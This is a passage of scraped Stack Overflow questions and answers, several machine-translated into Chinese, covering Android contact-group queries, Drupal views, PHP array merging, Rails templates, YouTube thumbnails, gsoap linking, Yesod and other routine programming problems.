1      | 702
1      | 704
3      | 702 
```

I've tried this:

```
Cursor cursor = contentResolver.query(ContactsContract.Data.CONTENT_URI, null, new String[] {
    ContactsContract.CommonDataKinds.GroupMembership.CONTACT_ID,
    ContactsContract.CommonDataKinds.GroupMembership.GROUP_SOURCE_ID
}, null, null, null); 
```

But that doesn't quite work. The GROUP_SOURCE_ID column returns weird numbers that aren't the ID of any groups. Sometimes it even returns 0 or a negative number.

I could construct a mapping of this by going through each group, and finding all contacts in that group, but that would take a lot of queries, and I'm trying to stay fast (apparently, just those few queries are quite slow!).

Can anyone tell me how I can get this contacts-to-groups mapping in one query?

Thanks!

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-12-31T07:23:07.927

```
 Cursor dataCursor = getContentResolver().query(
            ContactsContract.Data.CONTENT_URI,
            new String[]{
                    ContactsContract.Data.CONTACT_ID,
                    ContactsContract.Data.DATA1
            },
            ContactsContract.Data.MIMETYPE + "=?",
            new String[]{ContactsContract.CommonDataKinds.GroupMembership.CONTENT_ITEM_TYPE}, null
    ); 
```

通过使用它`dataCursor`，您将获得联系人数据库中所有联系人的和`contact_id`。`group_id`

```
 Cursor groupCursor = getContentResolver().query(
            ContactsContract.Groups.CONTENT_URI,
            new String[]{
                    ContactsContract.Groups._ID,
                    ContactsContract.Groups.TITLE
            }, null, null, null
    ); 
```

通过使用它`groupCursor`，您将获得联系人数据库中所有组的`group_id`和`group_title`。

因此，如果您想获取与`contact_id`第一个关联的所有组，请`dataCursor`使用合适的 select 语句。使用`dataCursor`你可以得到所有`group_id`与之相关的`contact_id`。现在使用`groupCursor`您可以获得有关与该特定联系人关联的所有组的信息。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2015-08-27T11:01:24.057

一个完整的答案将是：首先获取组游标（与上面的答案相同）

```
Cursor groups_cursor= getContentResolver().query(
        ContactsContract.Groups.CONTENT_URI,
        new String[]{
                ContactsContract.Groups._ID,
                ContactsContract.Groups.TITLE
        }, null, null, null
); 
```

使用以下代码将所有 group_id 和 group_title 存储在组 HashMap 中：

```
 if(groups_cursor!=null){
        while(groups_cursor.moveToNext()){
            String group_title = groups_cursor.getString(1);
            String id = groups_cursor.getString(0);
            groups.put(id, group_title);
        }
    } 
```

然后使用上述答案的data_cursor，获取contacts_ids 和他们的group_ids。

```
Cursor dataCursor = getContentResolver().query(
        ContactsContract.Data.CONTENT_URI,
        new String[]{
                ContactsContract.Data.CONTACT_ID,
                ContactsContract.Data.DATA1
        },
        ContactsContract.Data.MIMETYPE + "=?",
        new String[]{ContactsContract.CommonDataKinds.GroupMembership.CONTENT_ITEM_TYPE}, null
); 
```

现在使用 dataCursor 和组 HashMap。

```
 if(dataCursor!=null){
            while(dataCursor.moveToNext()){
                String id  = dataCursor.getString(0);
                String group_id= dataCursor.getString(1);
                String groupTitle = groups.get(group_id);
                Log.d(TAG, "groupTitle : " + groupTitle + " contact_id: " + id );
           }
  } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-06-13T12:10:46.660

```
 public static HashMap<String, String> getContactsForGroup(String groupID, Activity activity){
    Cursor dataCursor = activity.getContentResolver().query(
            ContactsContract.Data.CONTENT_URI,
            new String[]{                                                       // PROJECTION
                    ContactsContract.Data.CONTACT_ID,
                    ContactsContract.Data.DISPLAY_NAME,         // contact name
                    ContactsContract.Data.DATA1                 // group
            },
            ContactsContract.Data.MIMETYPE + " = ? " + "AND " +                 // SELECTION
            ContactsContract.Data.DATA1 +    " = ? ",           // set groupID
            new String[]{                                                       // SELECTION_ARGS
                    ContactsContract.CommonDataKinds.GroupMembership.CONTENT_ITEM_TYPE,
                    groupID
            },
            null
    );

    dataCursor.moveToFirst();
    HashMap<String, String> map = new HashMap<>();
    while (dataCursor.moveToNext()) //
    {
        String s0 = dataCursor.getString(0);                //contact_id
        String s1 = dataCursor.getString(1);                //contact_name
        String s2 = dataCursor.getString(2);                //group_id
        Log.d("tag", "contact_id: " + s0 + "  contact: " + s1 + "   groupID: "+ s2);
        map.put(s0, s1);
    }
    return map;
} 
```

# drupal-7 - Drupal 7 - How do I use pathauto taxonomy terms in views arguments

> ID：14097583
> 
> 赞同：2
> 
> 时间：2012-12-31T04:54:15.950
> 
> 标签：drupal-7, drupal-views, drupal-theming

I have been banging my head against this problem all day. I'm using Drupal 7, and I'm trying to create a contextual filter that uses the pathauto string for a taxonomy term, not the taxonomy term ID.

So, I can make this work:

[http://foobar.com/tags/1](http://foobar.com/tags/1)

But not:

[http://foobar.com/tags/tagname](http://foobar.com/tags/tagname)

I have created a contextual filter of 'Content: has taxonomy term ID'. I have turned on the default taxonomy view and modified the path in it to try to create a URL that will work. I have gone into /admin/config/search/path/patterns and modified the taxonomy term path. As a result I can make the numeric ID appear in almost any URL with any prefacing text, but I can't get my view to use the pathauto-generated string for a taxonomy term instead of the taxonomy ID.

Any ideas? Am I missing something? All help is appreciated.

--Marshall

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-31T05:02:48.793

默认视图“分类术语”正在使用与您尝试实现的非常相似的上下文过滤器，因此这可能会帮助您设置类似的内容。我会尝试创建类型分类而不是内容的视图。

# php - 对超群中的元素进行分组

> ID：14097586
> 
> 赞同：1
> 
> 时间：2012-12-31T04:54:52.790
> 
> 标签：php, arrays

目前我有一组元素数组，比如说，

```
[1, 2, 3]
[2, 4]
[5, 6, 7]
[1 , 44]
[5, 12]
etc... 
```

我想要做的是将这些组分组为超组，如果它们一起共享至少一个元素。也就是说，上面的数组应该变成：

```
[1, 2, 3, 4, 44]
[5, 6, 7, 12] 
```

我拥有的数据要大得多，我想知道执行此类操作的有效方法是什么。

我的猜测是取第一个数组，遍历所有其他数组，如果有交集，加入它们并从顶部重新开始，直到第一个与其他数组没有交集。然后继续第二个等等......

有更好的方法吗？如果它可以在 PHP 中轻松完成，我特别感兴趣，但伪代码也很好。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-01T22:10:02.263

所以，这是我想出的最好的：

```
$j = 0;
while(array_key_exists($j, $groups)){
    $i = $j + 1;

    while(array_key_exists($i, $groups)){
        if(count(array_intersect($groups[$j], $groups[$i])) > 0){
            $groups[$j] = array_merge($groups[$j], $groups[$i]);
            $groups[$j] = array_unique($groups[$j]);
            unset($groups[$i]);
            $i = $j + 1;
            $groups = array_values($groups);
        }
        else{
            $i = $i + 1;
        }
    }

    $j = $j + 1;
} 
```

# ruby-on-rails-3 - How to render content_for with a block in Rails 3?

> ID：14097588
> 
> 赞同：0
> 
> 时间：2012-12-31T04:54:56.963
> 
> 标签：ruby-on-rails-3, templates

I haven't been able to find a solution elsewhere. This is the code I'd like to work:

```
<%= render :layout => "l/run" do %><%-
     content_for :error do
   -%>Error - Missing arguments<%-
     end -%>
<%=  render :inline => @api.data.views["html"], :locals => {:result => @result} %>
<%- end -%> 
```

and in l/run:

```
<%-
...
  if readQuery.value?(nil)
-%><%= yield :error %><%-
  else
...
-%><%= yield %><%-
...
  end
-%> 
```

I feel like this approach should work but am stumped.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-31T04:57:37.030

Normally this should work

view1.html.erb

```
<%= yield :error%> 
```

view2.html.erb

```
<% content_for :error do %>
  #your code
<% end %> 
```

# ios - Youtube thumbnail from channel rss feed?

> ID：14097593
> 
> 赞同：1
> 
> 时间：2012-12-31T04:55:22.830
> 
> 标签：ios, rss, youtube, thumbnails, xcode4.5

I am trying to load a youtube channel's feed into a uitableview with an rss feed. I need this to display the thumbnail from the individual videos. I can only find this using the gdata client which does not work. Here is the code I have so far:

Videos.h:

```
#import <UIKit/UIKit.h>

@interface Videos : UITableViewController<NSXMLParserelegate>{
IBOutlet UITableView * newsTable;
UIActivityIndicatorView * activityIndicator;

CGSize cellSize;

NSXMLParser * rssParser;

NSMutableArray * stories;

// a temporary item; added to the "stories" array one at a time, and cleared for the     next one
NSMutableDictionary * item;

// it parses through the document, from top to bottom...
// we collect and cache each sub-element value, and then save each item to our array.
// we use these to track each current item, until it's ready to be added to the "stories" array
NSString * currentElement;
NSMutableString * currentTitle, * currentDate, * currentSummary, * currentLink;
}
- (void)parseXMLFileAtURL:(NSString *)URL;

@end 
```

Videos.m

```
#import "Videos.h"
#import "AppDelegate.h"

@implementation Videos

- (id)initWithNibName:(NSString *)nibNameOrNil bundle:(NSBundle *)nibBundleOrNil
{
self = [super initWithNibName:nibNameOrNil bundle:nibBundleOrNil];
if (self) {
    // Custom initialization
    self.tabBarItem.image = [UIImage imageNamed:@"clapboard@2x.png"];

}
return self;
}

- (void)viewDidLoad {
// Add the following line if you want the list to be editable

}

- (NSInteger)numberOfSectionsInTableView:(UITableView *)tableView {
return 1;
}

- (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section {
return [stories count];
}

- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath              *)indexPath {

static NSString *MyIdentifier = @"MyIdentifier";

UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:MyIdentifier];
if (cell == nil) {
    cell = [[UITableViewCell alloc] initWithStyle:UITableViewCellStyleDefault reuseIdentifier:MyIdentifier];

}

// Set up the cell
int storyIndex = [indexPath indexAtPosition: [indexPath length] - 1];
cell.textLabel.text=[[stories objectAtIndex: storyIndex] objectForKey: @"title"];

return cell;
}

- (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath {
// Navigation logic

int storyIndex = [indexPath indexAtPosition: [indexPath length] - 1];

NSString * storyLink = [[stories objectAtIndex: storyIndex] objectForKey: @"link"];
NSLog(@"%@",stories );
// clean up the link - get rid of spaces, returns, and tabs...
storyLink = [storyLink stringByReplacingOccurrencesOfString:@" " withString:@""];
storyLink = [storyLink stringByReplacingOccurrencesOfString:@"\n" withString:@""];
storyLink = [storyLink stringByReplacingOccurrencesOfString:@"  " withString:@""];

// open in Safari
[[UIApplication sharedApplication] openURL:[NSURL URLWithString:storyLink]];
}

- (void)viewWillAppear:(BOOL)animated {
[super viewWillAppear:animated];
}

- (void)viewDidAppear:(BOOL)animated {
[super viewDidAppear:animated];

if ([stories count] == 0) {
    NSString * path =     @"https://youtube.com/rss/user/TheGruenebergBrother/videos.rss";

    [self parseXMLFileAtURL:path];
}

cellSize = CGSizeMake([newsTable bounds].size.width, 60);
}

- (void)viewWillDisappear:(BOOL)animated {
}

- (void)viewDidDisappear:(BOOL)animated {
}

#pragma mark - parseing_Delegate_methods
- (void)parserDidStartDocument:(NSXMLParser *)parser{
NSLog(@"found file and started parsing");

}

- (void)parseXMLFileAtURL:(NSString *)URL
{
stories = [[NSMutableArray alloc] init];

//you must then convert the path to a proper NSURL or it won't work
NSURL *xmlURL = [NSURL URLWithString:URL];

// here, for some reason you have to use NSClassFromString when trying to alloc   NSXMLParser, otherwise you will get an object not found error
// this may be necessary only for the toolchain
rssParser = [[NSXMLParser alloc] initWithContentsOfURL:xmlURL];

// Set self as the delegate of the parser so that it will receive the parser delegate methods callbacks.
[rssParser setDelegate:self];

// Depending on the XML document you're parsing, you may want to enable these features of NSXMLParser.
[rssParser setShouldProcessNamespaces:NO];
[rssParser setShouldReportNamespacePrefixes:NO];
[rssParser setShouldResolveExternalEntities:NO];

[rssParser parse];

}

- (void)parser:(NSXMLParser *)parser parseErrorOccurred:(NSError *)parseError {
NSString * errorString = [NSString stringWithFormat:@"Unable to download story feed   from web site (Error code %i )", [parseError code]];
NSLog(@"error parsing XML: %@", errorString);

UIAlertView * errorAlert = [[UIAlertView alloc] initWithTitle:@"Error loading content" message:errorString delegate:self cancelButtonTitle:@"OK" otherButtonTitles:nil];
[errorAlert show];
}

- (void)parser:(NSXMLParser *)parser didStartElement:(NSString *)elementName namespaceURI:(NSString *)namespaceURI qualifiedName:(NSString *)qName attributes:(NSDictionary *)attributeDict{
//NSLog(@"found this element: %@", elementName);
currentElement = [elementName copy];
if ([elementName isEqualToString:@"item"]) {
    // clear out our story item caches...
    item = [[NSMutableDictionary alloc] init];
    currentTitle = [[NSMutableString alloc] init];
    currentDate = [[NSMutableString alloc] init];
    currentSummary = [[NSMutableString alloc] init];
    currentLink = [[NSMutableString alloc] init];
}

}

- (void)parser:(NSXMLParser *)parser didEndElement:(NSString *)elementName namespaceURI:(NSString *)namespaceURI qualifiedName:(NSString *)qName{
//NSLog(@"ended element: %@", elementName);
if ([elementName isEqualToString:@"item"]) {
    // save values to an item, then store that item into the array...
    [item setObject:currentTitle forKey:@"title"];
    [item setObject:currentLink forKey:@"link"];
    [item setObject:currentSummary forKey:@"summary"];
    [item setObject:currentDate forKey:@"date"];

    [stories addObject:[item copy]];
    NSLog(@"adding story: %@", currentTitle);
}

}

- (void)parser:(NSXMLParser *)parser foundCharacters:(NSString *)string{
//NSLog(@"found characters: %@", string);
// save the characters for the current item...
if ([currentElement isEqualToString:@"title"]) {
    [currentTitle appendString:string];
} else if ([currentElement isEqualToString:@"link"]) {
    [currentLink appendString:string];
} else if ([currentElement isEqualToString:@"description"]) {
    [currentSummary appendString:string];
} else if ([currentElement isEqualToString:@"pubDate"]) {
    [currentDate appendString:string];
}

}

- (void)parserDidEndDocument:(NSXMLParser *)parser {

[activityIndicator stopAnimating];
[activityIndicator removeFromSuperview];

NSLog(@"all done!");
NSLog(@"stories array has %d items", [stories count]);
[newsTable reloadData];
}

- (BOOL)shouldAutorotateToInterfaceOrientation:(UIInterfaceOrientation)interfaceOrientation {
// Return YES for supported orientations
return (interfaceOrientation == UIInterfaceOrientationPortrait);
}

- (void)didReceiveMemoryWarning {
[super didReceiveMemoryWarning]; // Releases the view if it doesn't have a superview
// Release anything that's not essential, such as cached data
}

- (void)dealloc {

[currentElement release];
[rssParser release];
[stories release];
[item release];
[currentTitle release];
[currentDate release];
[currentSummary release];
[currentLink release];

[super dealloc];
}

@end 
```

Also where should the code go, and what is the code? Thanks

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-31T05:04:53.200

有一个缩略图网址，

```
http://img.youtube.com/vi/VIDEOIDHERE/0.jpg
http://img.youtube.com/vi/VIDEOIDHERE/1.jpg
http://img.youtube.com/vi/VIDEOIDHERE/2.jpg
http://img.youtube.com/vi/VIDEOIDHERE/3.jpg 
```

将为您获取任何视频的缩略图。数字代表质量，零是最高的。例如：

```
http://img.youtube.com/vi/F2Jko4Ipdrs/0.jpg 
```

# c++ - 如何设计一个以容器为空为停止条件的循环

> ID：14097597
> 
> 赞同：0
> 
> 时间：2012-12-31T04:55:44.360
> 
> 标签：c++, loops

我很抱歉标题很棘手，这是示例

```
graph main_graph = //initialize graph
graph sub_graph = //pick a subset of edges from the main_graph
while ( ! sub_graph.size() == 0) {
    select_edge();    //here I pick an edge basing on some heuristics
    reduce_graph();   //here I remove some edges from the main_graph
    sub_graph = //pick a subset of edges from the main_graph
} 
```

所以关键是我必须`sub_graph`在进入循环之前（因为它可能已经是空的）和进入新迭代之前编写相同的代码来定义。如果不是我实际上有三个具有相同问题的嵌套循环，并且初始化它们的代码`sub_graph`是一堆代码行，那么这不会那么糟糕，所以我的代码看起来会重复很多。

关于如何更好地设计这个循环的任何建议？我没有限制（可以使用`for`，`do-while`...）

即使这是伪代码，因为更像是一个“设计”问题，我正在用 C++ 编码！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-31T05:08:16.180

为避免重复大量代码，请将代码放入函数中：

```
graph calc_subgraph(...) {...} 
```

然后使用它来初始化和重新计算您的值：

```
for (graph subgraph = calc_subgraph(...); subgraph.size() != 0; subgraph = calc_subgraph(...)) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-31T05:12:26.873

如果初始化 sub_Graph 的代码有很多行，那么编写一个返回初始化图的函数，或者通过传递的引用/指针初始化 sub_graph 的函数。然后只需在循环内调用该函数。这将减少您必须编写和阅读的代码量。涉及使用相同代码两次的循环不时出现。

编写输出逗号分隔列表的循环就是一个很好的例子，因为您希望逗号保留在列表项的内部。因此，您可以在循环之前执行第一项，也可以在循环之后删除逗号。

In these kind of cases, calling the initializing code before the loop, and then again at the end of each loop iteration may be faster then putting a conditional test in the loop to skip parts of it every time.

# c# - How to build .exe in visual studio 2012

> ID：14097598
> 
> 赞同：3
> 
> 时间：2012-12-31T04:55:52.183
> 
> 标签：c#

I used visual studio 2012 to create project and now i want to build that project to .exe file. what do i must do?

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-12-31T04:57:01.837

If it's a [Console application](http://msdn.microsoft.com/en-us/library/vstudio/k1sx6ed2.aspx) or [Winform](http://msdn.microsoft.com/en-us/library/dd492132.aspx) or [WPF](http://channel9.msdn.com/Events/Build/2012/2-002) application then you will get the executable by just building the application and it will be in your `yourApplicationPath/Bin/Debug`

**EDIT** (Based on the comment)

*You have to rephrase your question.* You need to see that:

[Visual Studio setup projects (vdproj) will not ship with future versions of Visual Studio](http://blogs.msdn.com/b/buckh/archive/2011/03/17/visual-studio-setup-projects-vdproj-will-not-ship-with-future-versions-of-vs.aspx)

> The Visual Studio setup projects will not ship again – Visual Studio 2010 was the last release with support for it. So, you’ll want to make plans to migrate to something else. Of course, I’d suggest looking into WiX, and there are other options as well. The MSDN page [Choosing a Windows Installer Deployment Tool](http://msdn.microsoft.com/en-us/library/ee721500%28v=vs.100%29.aspx) contains a table showing a comparison of VS setup projects, WiX, and InstallShield Limited Edition.

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-12-31T05:06:04.197

首先从解决方案配置下拉框中选择“发布”，否则您编译/分发的可执行文件仍将处于调试模式。这不仅会影响性能，还会产生其他负面影响。

接下来转到构建菜单选项卡并选择构建解决方案（或按 F6）。

然后找到包含项目的文件夹并导航到：yourproject\bin\Release\

要完全发布您的程序，请从“构建”选项卡中选择“发布”并按照向导进行操作。将创建一个 Setup.exe。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-12-31T04:57:11.693

The executable is built every time you run the project. You can find the `EXE` on the `bin\debug` folder located on your project folder.

```
..SolutionName\ProjectName\bin\Debug\ 
```

but if you mean that you want to create a `Setup File` or `MSI` (*or installers*), please see the article below

*   [How to create a Setup package by using Visual Studio .NET](http://support.microsoft.com/kb/307353?wa=wsignin1.0)

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2012-12-31T04:57:25.520

Every time you compile and run your application, it creates an EXE which can be found in the following location:

> /path/to/project/bin/debug/myApp.exe

Within the menus of VisualStudio there is also an option toExport your project, which will build it to a specified path, as well, there is an option for creating an installer package if you so desire.

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2012-12-31T04:57:56.523

does it have "Build" under Menu? if not, go to "tools"->"setting", choose "expert", then you should be able to see it now.

# loops - Looping through A Folder and all its subdirectories

> ID：14097601
> 
> 赞同：1
> 
> 时间：2012-12-31T04:56:30.347
> 
> 标签：loops, for-loop, import, directory

Ok. Many trouble shooting hours ...and many error "dings" later, I'm still having the same problem. Due to my beginner skills I'm having problems achieving the following segment of my project:

I will be as detailed as possible so I can hopefully nail it this time:

*   On my computer i have a folder C:\data which contains many different subfolders.

*   The subfolders are named by dates in a MMDDYY fashion. For example "040312"

*   In each subfolder are excel files named after Baseball teams. each subfolder may contain a different combination of xls files.

I am trying to write code that achieves the following objectives:

1.) Loops through all the subfolders of the C:\data folder looking for xls files that have the filenames: Angles.xls, Diamondbacks.xls, etc.

2.) If the files are found in each subfolder import the spreadsheet data and generate a plot of the data titled "Score" and "Allow".

3.) If the file is not found any given subfolder skip and continue to the next file to be located. 4.)Then save the generated plot in the same folder that the spreadsheet was imported from as a .fig and a .bmp file.

I've gotten hints to use various functions like: genpath, dir, but the code I've been fumbling through isn't able to achieve my goals.

a) the script doesn't import the excel files from all the subfolders

b) the script wont save the .fig or .bmp file in the associated subfolder

Here is the code I have been fumbling through:

%I know all of this is wrong wrong wrong. Please help to adjust my code to %achieve the objectives outlined above!

```
addpath(genpath('c:\data'))
folder = 'c:\data';
subdirs = dir(folder);
subdirs(~[subdirs.isdir]) = [] ; 
numberOfFolders = length(subdirs);
if numberOfFolders <= 0
    uiwait(warndlg('Number of folders = 0!'))
end
wantedfiles = {'Angels' 'Diamondbacks' 'Orioles' 'Royals' 'Yankees' 'Mets' 'Giants'};

for K = 1 : numberOfFolders
  thissubdir = subdirs(K).name;
if strcmp(thissubdir, '.') || strcmp(thissubdir, '..')
      continue; 
end
  subdirpath = [folder '\' thissubdir];

for L = 1 : length(wantedfiles)  

for wantedfiles = {'Angels' 'Diamondbacks' 'Orioles' 'Royals' 'Yankees' 'Mets' 'Giants'};
folder = '';
   fileToRead1 = [wantedfiles{1} '.xls'];
   sheetName='Sheet1';
if exist(fileToRead1, 'file') == 0
  % File does not exist
  % Skip to bottom of loop and continue with the loop
    continue;
end 
```

%This is to import the data and organize it % All of this code I had auto-generated from importing files manually

```
 [numbers, strings, raw] = xlsread(fileToRead1, sheetName);
if ~isempty(numbers)
    newData1.data =  numbers;
end

if ~isempty(strings) && ~isempty(numbers)
    [strRows, strCols] = size(strings);
    [numRows, numCols] = size(numbers);
    likelyRow = size(raw,1) - numRows;
    % Break the data up into a new structure with one field per column.
    if strCols == numCols && likelyRow > 0 && strRows >= likelyRow
        newData1.colheaders = strings(likelyRow, :);
    end
end

% Create new variables in the base workspace from those fields.
for i = 1:size(newData1.colheaders, 2)
    assignin('base', genvarname(newData1.colheaders{i}), newData1.data(:,i));
end

% Now I execute the plotting of data
subplot (2,1,1), plot(Score,Allow)

title([wantedfiles{1} 'Testing to see if it works']);
subplot (2,1,2), plot(Allow,Score)

title('Well, did it?'); 
```

% here I save the generated plots, but they don't save where I want them to

```
saveas(gcf,[wantedfiles{1} ' did it work.fig']);
saveas(gcf,[wantedfiles{1} ' did it work.bmp']);
end
end
end 
```

%At the end of the script I still was unable to loop over the files that I wanted rmpath(genpath('c:\data'));

# c - gsoap client compile/link error

> ID：14097603
> 
> 赞同：0
> 
> 时间：2012-12-31T04:56:45.470
> 
> 标签：c, compiler-errors, gsoap

Now I am writing a program to call a web service. I write testMain.c. The others are generated by `wsdl2h` and `soapcpp2`.

My compiling command is like this:

```
 gcc -Wall -g -c -L. soapC.c soapClient.c stdsoap2.c testMain.c
 gcc -o testMain -L/usr/lib -lgsoap -lgsoapck -lgsoapssl soapC.o soapClient.o stdsoap2.o testMain.o 
```

And I get these errors. Please help me.

```
stdsoap2.o: In function `soap_print_fault':
/test/stdsoap2.c:16279: undefined reference to `soap_check_faultsubcode'
/test/stdsoap2.c:16281: undefined reference to `soap_check_faultdetail'
stdsoap2.o: In function `soap_sprint_fault':
/test/stdsoap2.c:16341: undefined reference to `soap_check_faultdetail'
collect2: ld returned 1 exit status 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-31T07:14:53.870

最新版本的 GCC/ld/GNU 工具链要求以特定顺序指定对象和库文件，以便链接器可以按照它们相互依赖的相同顺序找到符号。这意味着库应该放在命令行的末尾；你的第二行（当你链接时）应该是

```
gcc -o testMain -L/usr/lib soapC.o soapClient.o stdsoap2.o testMain.o -lgsoap -lgsoapck -lgsoapssl 
```

反而。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-01T01:29:07.150

我在网上搜索，发现一篇与我的问题非常相似的帖子。我使用这个解决方案并解决了这个问题。[http://www.mail-archive.com/gsoap@yahoogroups.com/msg01022.html](http://www.mail-archive.com/gsoap@yahoogroups.com/msg01022.html)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-04T20:54:33.047

您不需要链接`stdsoap2.o`到您的项目，因为它已经包含在`libgsoap`（通过 gcc 链接器选项给出`-lgsoap)`。尝试`stdsoap2.c`从您的项目中排除。来自[gSOAP 常见问题解答](http://www.cs.fsu.edu/~engelen/soapfaq.html)：

> 我收到 gcc/g++ (GNU GCC) 的链接错误。我应该怎么办？对于 C 应用程序：使用 soapcpp2 选项 -c 生成 C 代码，仅使用包的 .c 文件，与 libgsoap.a (-lgsoap) 链接**或使用**lib 的源代码 stdsoap2.c（和适用时的 dom.c）。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2022-01-27T14:26:00.910

我从源代码编译的 gsoap-2.8.16 遇到了同样的问题。（那个版本是 CentOS 6 附带的。）

首先，我检查了一个丢失的库。根据`nm`gsoap-2.8.16 提供的所有静态库中使用的：

```
for X in /usr/local/lib/libgsoap*.a ; do echo $X; nm $X | grep soap_check_faultdetail; done` 
```

事实证明，没有一个库提供缺少的符号。

简要查看源代码可以发现，这两个方法的预期返回类型`soap_check_faultdetail`和`soap_check_faultsubcode`是`const char*`，并且这些用于生成错误消息。

在我看来，这些似乎是客户端必须提供的回调。*也许他们的实现依赖于 WSDL，并且将由 gsoap 代码生成实用程序提供 - 我不知道，请参阅上面或下面的@ChristianAmmer 的答案。*

无论如何，因为我知道没有提供符号，并且这里可能可以接受以 null 结尾的字符串，所以我只提供了我自己的无操作实现：

```
// gsoap-missing-symbols.cpp
extern "C" {
const char* soap_check_faultdetail() { return 0; }
const char* soap_check_faultsubcode() { return 0; }
} 
```

这是一个蛮力解决方案。如果您遵循此解决方案，您可能应该在将来检查链接器警告；也许某些机制（例如来自 gsoap 代码生成器）会在开发后期提供冲突的实现。

对于更高版本的 gsoap，我相信这些符号不再使用并且可以删除（或重命名），`soap_check_faultX`参见[https://www.genivia.com/changelog.html](https://www.genivia.com/changelog.html)。

# entity - Yesod/Persistent 实体派生 Show

> ID：14097615
> 
> 赞同：6
> 
> 时间：2012-12-31T04:58:32.093
> 
> 标签：entity, persistent, yesod

在[Yesod book 的 Persistent 章节中](http://www.yesodweb.com/book/persistent)，给出了一个示例，其中该实体

```
{-# LANGUAGE QuasiQuotes, TypeFamilies, GeneralizedNewtypeDeriving, TemplateHaskell, OverloadedStrings, GADTs #-}
import Database.Persist
import Database.Persist.TH
import Database.Persist.Sqlite
import Control.Monad.IO.Class (liftIO)

mkPersist sqlSettings [persist|
Person
    name String
    age Int
    deriving Show
|] 
```

生成代码

```
{-# LANGUAGE TypeFamilies, GeneralizedNewtypeDeriving, OverloadedStrings, GADTs #-}
import Database.Persist
import Database.Persist.Store
import Database.Persist.Sqlite
import Database.Persist.GenericSql.Raw (SqlBackend)
import Database.Persist.EntityDef
import Control.Monad.IO.Class (liftIO)
import Control.Applicative

data Person = Person
    { personName :: String
    , personAge :: Int
    }
  deriving (Show, Read, Eq)

type PersonId = Key Person

instance PersistEntity Person where
    -- A Generalized Algebraic Datatype (GADT).
    -- This gives us a type-safe approach to matching fields with
    -- their datatypes.
    data EntityField Person typ where
        PersonId   :: EntityField Person PersonId
        PersonName :: EntityField Person String
        PersonAge  :: EntityField Person Int

    type PersistEntityBackend Person = SqlBackend

    toPersistFields (Person name age) =
        [ SomePersistField name
        , SomePersistField age
        ]

    fromPersistValues [nameValue, ageValue] = Person
        <$> fromPersistValue nameValue
        <*> fromPersistValue ageValue
    fromPersistValues _ = Left "Invalid fromPersistValues input"

    -- Information on each field, used internally to generate SQL statements
    persistFieldDef PersonId = FieldDef
        (HaskellName "Id")
        (DBName "id")
        (FTTypeCon Nothing "PersonId")
        []
    persistFieldDef PersonName = FieldDef
        (HaskellName "name")
        (DBName "name")
        (FTTypeCon Nothing "String")
        []
    persistFieldDef PersonAge = FieldDef
        (HaskellName "age")
        (DBName "age")
        (FTTypeCon Nothing "Int")
        [] 
```

为什么添加`deriving Show`到 Person 实体会生成所有三个类型类的派生`(Show, Read, Eq)`？我对 Haskell 和 Yesod 很陌生，所以如果很明显，我很抱歉，但我在任何地方都找不到答案！这只是文档中的错误吗？谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-31T06:55:38.503

简单：这是书中的错字:)。如果您查看实际生成的代码（带有`-ddump-splices`），您会发现它实际上只是派生`Show`实例。

# android - How to get SFDC Lead Object Views in my Android application, I am using REST Api but there is no class called ApexPage.StandardSetController

> ID：14097617
> 
> 赞同：1
> 
> 时间：2012-12-31T04:59:12.603
> 
> 标签：android

How to get `SFDC` Lead Object Views in my Android application. I am using **REST Api** but there is no class called `ApexPage.StandardSetController`.

# node.js - 是否可以使用 node.js 在客户端和服务器之间共享数据？

> ID：14097623
> 
> 赞同：2
> 
> 时间：2012-12-31T05:00:26.280
> 
> 标签：node.js

有没有办法在 node.js 中的客户端和服务器之间共享数据（包括对象）？我曾经依赖一个为此目的而设计的名为 now.js 的模块，但[该项目已停产](http://news.ycombinator.com/item?id=4667826)，我正在尝试寻找替代品。既然 now.js 已经被放弃了，还有其他方法可以在客户端和服务器之间无缝同步变量吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-31T08:54:00.323

在 now.js 之后，最接近的两个竞争者是 shareJS 和 dnode：

[http://sharejs.org/](http://sharejs.org/)

[https://github.com/substack/dnode](https://github.com/substack/dnode)

# mysql - 从ms访问mysql导出包含图片（BLOB）的表

> ID：14097627
> 
> 赞同：1
> 
> 时间：2012-12-31T05:00:46.137
> 
> 标签：mysql, ms-access, blob, ole

我有一个**MS-ACCESS 格式**(MDB) 的数据库表，其中包含以下结构

```
Form_No   Int
Picture   OLE OBJECT 
```

当我使用 Navicat 在**MySQL**中导入此表时，PICTURE 字段将转换为**BLOB**，并且该字段没有图像（图像丢失）。该怎么办 ？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-31T05:33:48.713

OLE 对象是棘手的野兽 - 将它们转换为图片并非易事。

[本文](http://www.codeproject.com/Articles/90908/Saving-OLE-Object-as-Image-Datatype-in-SQL)是一个 C# 程序示例（约 5KB），它可以将 OLE 对象转换为少数支持的格式（JPEG、BMP、PDF、WORD）。

您应该能够使其适应您的需求。我认为首先在 MS Access 表中创建新的 BLOB 图片列会更容易，使用 C# 将其转换为真正的 JPEG（不是 OLE！），然后才将其导出到 MySQL。

